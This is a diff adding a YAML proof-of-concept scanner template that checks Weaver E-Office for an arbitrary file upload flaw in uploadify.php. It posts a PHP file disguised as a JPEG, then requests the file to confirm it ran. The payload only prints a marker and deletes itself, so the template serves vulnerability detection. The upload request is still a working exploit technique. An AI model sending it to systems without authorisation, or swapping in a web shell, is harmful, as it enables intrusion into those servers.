@@ -1,0 +1,35 @@
+id: poc-yaml-weaveroa-E-Office-uploadify-arbitrary-upload
+info:
+  name: 泛微OA-E-Office-uploadify-任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: e-office
+variables:
+  fname: random_str(20)
+requests:
+- raw: 'POST /inc/jquery/uploadify/uploadify.php HTTP/1.1
+
+    Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+
+    --e64bdf16c554bbc109cecef6451c26a4
+
+    Content-Disposition: form-data; name="Filedata"; filename="{{.fname}}.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo "test-{{.fname}}";unlink(__FILE__);?>
+
+
+    --e64bdf16c554bbc109cecef6451c26a4--
+
+    '
+  expression: status_code == 200 && !contains(body, "<") && matches(body, "[0-9]{8,12}")
+  output:
+  - regex_match(body, "(?P<fpath>[0-9]{8,12})")
+- method: GET
+  path: /attachment/{{.fpath}}/{{.fname}}.php
+  expression: status_code == 200 && contains(body, concat("test-",fname))
+transport: http
